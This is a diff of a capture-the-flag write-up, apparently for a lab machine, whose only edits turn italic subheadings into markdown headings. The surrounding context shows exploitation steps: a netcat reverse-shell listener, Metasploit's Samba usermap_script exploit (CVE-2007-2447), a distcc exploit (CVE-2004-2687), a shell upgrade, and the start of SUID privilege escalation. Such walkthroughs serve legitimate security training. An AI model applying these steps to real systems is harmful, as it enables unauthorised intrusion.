@@ -149,7 +149,7 @@ The exploit above relates to [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CV
 
 We can exploit this using a [python script](https://github.com/amriunix/CVE-2007-2447) or [metasploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script), both of which should achieve the same outcome.
 
-*Python Script*
+### Python Script
 Before running the script we'll need to setup a netcat listener
 ```sh
 root@kali:~# nc -lvnp 4444
@@ -173,7 +173,7 @@ pwd
 /
 ```
 
-*Metasploit*
+### Metasploit
 Before running the exploit we need to locate the module and set the options
 ```sh
 msf5 > use exploit/multi/samba/usermap_script
@@ -241,7 +241,7 @@ PORT     STATE SERVICE VERSION
 ```
 distccd is a server which runs jobs on a distributed C/C++ compiler, the version currently running is vulnerable to [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687) and can be exploited using [metasploit](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec), an [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) or a [python script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
 
-*Python Script*
+### Python Script
 I try not to rely on metasploit too much, this python script does the job and achieves the same outcome.
 
 First we need to set up another netcat listener
@@ -267,7 +267,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 daemon@lame:/tmp$
 ```
 
-*Escalating Privileges*
+### Escalating Privileges
 Now we have a nicer shell we can focus on escalating priviliges, one common method to do this is with [SUID binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/).
 
 We can search for SUID binaries using the find command
